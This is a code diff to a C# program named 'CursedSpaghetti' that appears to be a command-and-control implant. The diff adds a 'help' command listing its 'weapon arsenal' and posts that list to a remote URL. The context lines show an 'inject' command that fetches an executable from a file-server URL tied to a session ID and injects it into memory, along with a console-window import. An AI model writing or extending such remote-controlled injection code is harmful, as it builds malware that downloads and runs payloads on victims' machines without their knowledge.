@@ -30,6 +30,18 @@ namespace CursedSpaghetti
 
         }
 
+        private static string WeaponHelp()
+        {
+            {
+                return "!#!\n  Weapon Arsenal\n" +
+                    " ----------------------------------------------------------\n" +
+                    "   basicenum               Basic enumeration\n" +
+                    "   help                    Print this message\n" +
+                    "   inject                  Inject an executable into the memory\n";
+
+            }
+        }
+
         [DllImport("kernel32.dll")]
         static extern public IntPtr GetConsoleWindow();
 
@@ -95,6 +107,10 @@ namespace CursedSpaghetti
                 case "inject":
                     string targetFile = weapon.Substring(7).Replace(" ", "");
                     Injector.Inject(String.Format("{0}/{1}/{2}", fs_url, sessionid, targetFile));
+                    break;
+                case "help":
+                    string output = WeaponHelp();
+                    Utilities.Post(url, output.ToString());
                     break;
                 default:
                     Post(url, "#!#Weapon does not exist");
